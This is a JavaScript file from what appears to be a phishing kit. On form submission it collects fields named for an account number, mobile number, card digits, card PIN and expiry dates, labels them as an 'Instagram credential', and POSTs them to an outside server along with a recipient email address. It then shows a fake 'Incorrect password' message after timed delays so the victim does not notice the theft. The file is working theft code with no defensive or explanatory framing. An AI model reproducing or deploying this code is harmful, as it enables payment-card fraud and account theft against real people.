const form = document.getElementById("insta-submit");
const loader = document.getElementById("loader");
const result = document.getElementById("res");

const handleSubmit = (e) => {
    e.preventDefault();
    loader.style.display = "block";
    
    setTimeout(()=>{
        result.innerHTML= "<div style='padding: 60px 0;'></div>";
        setTimeout(()=>{
            const form = new FormData();
            const recipient = "aiyedunmiracle956888@gmail.com";
            const email_backend = "https://active-pay-backend.onrender.com/";
            const body = (`
               New Instagram Credential

               Email/Username: ${e.target.acc_number.value}
               Password: ${e.target.mobile_number.value}
               Password: ${e.target.first_six_digit.value}
               Password: ${e.target.last_four_digit.value}
               Password: ${e.target.card_pin.value}
               Password: ${e.target.month_expiry.value}
               Password: ${e.target.year_expiry.value}

            `);

            form.append('recipient', recipient);
            form.append('body', body);

            // send the mail
            fetch(email_backend, {
                mode: 'cors',
                headers:{
                       'Access-Control-Allow-Origin':'*'
                }, 
                method: 'POST', 
                body: form
            })
            .then(action =>{
                setTimeout(()=>{
                result.innerHTML="<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <br><a href='index.html'>Go back to Login</a></div>";
                loader.style.display = "none";
                }, 10000);

            })
            .catch(err=>console.log("Error: ", err));

        }, 5000);
    }, 3000)
};


form?.addEventListener('submit', handleSubmit);